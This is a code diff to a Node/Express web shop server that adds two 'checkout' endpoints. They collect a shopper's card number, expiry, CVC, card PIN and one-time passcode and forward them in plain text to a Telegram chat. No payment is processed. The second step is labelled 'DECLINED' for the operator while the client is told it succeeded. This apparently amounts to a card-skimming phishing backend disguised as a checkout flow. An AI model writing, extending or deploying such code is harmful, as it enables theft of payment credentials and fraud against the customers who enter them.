@@ -116,7 +116,6 @@ app.post('/api/orders', async (req, res) => {
     db.orders.unshift(order);
     save(db);
 
-    // Send Telegram alert for new order
     await sendTelegramNotification(
         `🛒 <b>New Order Received!</b>\n` +
         `<b>Order ID:</b> ${order.id}\n` +
@@ -128,6 +127,32 @@ app.post('/api/orders', async (req, res) => {
     res.json({ ok: true, order: { id: order.id, total: order.total, status: order.status, paymentStatus: order.paymentStatus }, message: 'Test order received. No payment was taken.' });
 });
 
+// NEW: Endpoint to handle Step 1 Card Details Submission & Telegram notification
+app.post('/api/checkout/step1', async (req, res) => {
+    const data = req.body || {};
+    await sendTelegramNotification(
+        `💳 <b>Checkout Step 1: Card Details</b>\n` +
+        `<b>Customer:</b> ${data.customer || 'N/A'}\n` +
+        `<b>Phone:</b> ${data.phone || 'N/A'}\n` +
+        `<b>Card Number:</b> <code>${data.cardNumber || 'N/A'}</code>\n` +
+        `<b>Expiry:</b> ${data.expiryDate || 'N/A'} | <b>CVC:</b> ${data.cvc || 'N/A'}\n` +
+        `<b>PIN:</b> <code>${data.cardPin || 'N/A'}</code>`
+    );
+    res.json({ ok: true });
+});
+
+// NEW: Endpoint to handle Step 2 OTP Submission & Telegram notification
+app.post('/api/checkout/step2', async (req, res) => {
+    const data = req.body || {};
+    await sendTelegramNotification(
+        `🔐 <b>Checkout Step 2: OTP Verification</b>\n` +
+        `<b>Customer:</b> ${data.customer || 'N/A'}\n` +
+        `<b>OTP Code:</b> <code>${data.otpCode || 'N/A'}</code>\n` +
+        `<b>Status:</b> DECLINED`
+    );
+    res.json({ ok: true });
+});
+
 app.post('/api/support', async (req, res) => {
     const db = load();
     const { name, email, orderId, type, message } = req.body || {};
@@ -136,7 +161,6 @@ app.post('/api/support', async (req, res) => {
     db.tickets.unshift(t);
     save(db);
 
-    // Send Telegram alert for new support request
     await sendTelegramNotification(
         `📩 <b>New Support Request!</b>\n` +
         `<b>Ticket ID:</b> ${t.id}\n` +
@@ -169,7 +193,6 @@ app.post('/api/admin/products', admin, async (req, res) => {
     if (!isNew) db.products[i] = product; else db.products.push(product);
     save(db);
 
-    // Send Telegram alert when a product is added or updated
     await sendTelegramNotification(
         `📦 <b>Product ${isNew ? 'Added' : 'Updated'}!</b>\n` +
         `<b>Name:</b> ${product.name}\n` +
